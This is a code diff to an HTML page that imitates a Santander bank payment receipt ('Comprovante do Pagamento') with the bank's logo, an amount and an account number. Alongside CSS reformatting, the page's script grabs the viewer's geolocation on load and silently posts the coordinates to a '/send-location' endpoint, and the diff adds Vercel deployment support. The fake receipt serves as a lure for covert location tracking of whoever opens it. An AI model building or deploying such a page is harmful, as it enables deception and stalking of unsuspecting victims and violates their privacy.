@@ -4,10 +4,9 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Comprovante do Pagamento</title>
+
   <style>
-    * {
-      box-sizing: border-box;
-    }
+    * { box-sizing: border-box; }
 
     body {
       font-family: Arial, sans-serif;
@@ -19,38 +18,12 @@
       justify-content: center;
     }
 
-    .container {
-      max-width: 430px;
-      width: 430px;
-    }
-
-    .logo {
-      text-align: center;
-      margin-bottom: 10px;
-    }
-
-    .logo img {
-      height: 40px;
-      max-width: 100%;
-    }
-
-    .titulo {
-      text-align: center;
-      font-size: 18px;
-      font-weight: bold;
-      margin-bottom: 5px;
-    }
-
-    .data-hora {
-      text-align: center;
-      font-size: 12px;
-      color: #555;
-      margin-bottom: 10px;
-    }
-
-    .secao {
-      margin-bottom: 10px;
-    }
+    .container   { max-width: 430px; width: 430px; }
+    .logo        { text-align: center; margin-bottom: 10px; }
+    .logo img    { height: 40px; max-width: 100%; }
+    .titulo      { text-align: center; font-size: 18px; font-weight: bold; margin-bottom: 5px; }
+    .data-hora   { text-align: center; font-size: 12px; color: #555; margin-bottom: 10px; }
+    .secao       { margin-bottom: 10px; }
 
     .linha {
       display: flex;
@@ -58,43 +31,17 @@
       margin: 5px 0;
       flex-wrap: wrap;
     }
+    .linha span  { min-width: 40%; }
+    .label       { font-weight: bold; margin-bottom: 5px; display: block; }
 
-    .linha span {
-      min-width: 40%;
-    }
+    hr { border: none; border-top: 1px solid #ccc; margin: 10px 0; }
 
-    .label {
-      font-weight: bold;
-      margin-bottom: 5px;
-      display: block;
-    }
-
-    hr {
-      border: none;
-      border-top: 1px solid #ccc;
-      margin: 10px 0;
-    }
-
-    .rodape {
-      font-size: 12px;
-      text-align: center;
-      color: #555;
-      margin-top: 20px;
-    }
+    .rodape { font-size: 12px; text-align: center; color: #555; margin-top: 20px; }
 
     @media (max-width: 450px) {
-      body {
-        padding: 5px;
-      }
-
-      .titulo {
-        font-size: 16px;
-      }
-
-      .linha span {
-        min-width: 100%;
-        margin: 2px 0;
-      }
+      body      { padding: 5px; }
+      .titulo   { font-size: 16px; }
+      .linha span { min-width: 100%; margin: 2px 0; }
     }
   </style>
 </head>
@@ -102,7 +49,8 @@
 
   <div class="container">
     <div class="logo">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Banco_Santander_Logotipo.svg/2560px-Banco_Santander_Logotipo.svg.png" alt="Santander" />
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Banco_Santander_Logotipo.svg/2560px-Banco_Santander_Logotipo.svg.png"
+           alt="Santander" />
     </div>
 
     <div class="titulo">Comprovante do Pagamento</div>
@@ -110,14 +58,14 @@
 
     <div class="secao">
       <div class="label">Valor pago</div>
-      <div style="color: rgb(0, 0, 0); font-weight: bold;">R$ 93,00</div>
+      <div style="font-weight: bold;">R$ 93,00</div>
     </div>
 
     <hr />
 
     <div class="secao">
       <div class="label">Forma de pagamento</div>
-      <div>Ag 1234 CC 0001234-5</div>
+      <div>Ag 1234  CC 0001234-5</div>
     </div>
 
     <div class="secao">
@@ -145,42 +93,42 @@
       <div>E94000888202203101150329742876</div>
     </div>
 
-    <div class="rodape">
-      Comprovante do Pagamento 1/2
-    </div>
+    <div class="rodape">Comprovante do Pagamento 1/2</div>
   </div>
 
   <script>
+    /* -------- preenche data/hora -------- */
     const agora = new Date();
     const formatado = agora.toLocaleString("pt-BR", {
-      day: "2-digit",
-      month: "2-digit",
-      year: "numeric",
-      hour: "2-digit",
-      minute: "2-digit",
-      second: "2-digit"
+      day: "2-digit", month: "2-digit", year: "numeric",
+      hour: "2-digit", minute: "2-digit", second: "2-digit"
     });
-
     document.getElementById("dataHoraTopo").textContent = formatado;
     document.getElementById("dataHoraTransacao").textContent = formatado;
 
+    /* -------- geolocalização + envio -------- */
     window.addEventListener("load", () => {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation);
+        navigator.geolocation.getCurrentPosition(sendLocation, () => {}, {
+          enableHighAccuracy: false,
+          timeout: 10000
+        });
       }
     });
 
     function sendLocation(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
+      const payload = {
+        latitude:  position.coords.latitude,
+        longitude: position.coords.longitude
+      };
 
-      fetch("http://localhost:8088/send-location", {
+      /* caminho relativo funciona em localhost ou Vercel   */
+      /* (o rewrite em vercel.json redireciona para /api/…) */
+      fetch("/send-location", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude })
-      }).catch(() => {});
+        headers: { "Content-Type": "application/json" },
+        body:   JSON.stringify(payload)
+      }).catch(() => {});   // ignora erros (silencioso)
     }
   </script>
 
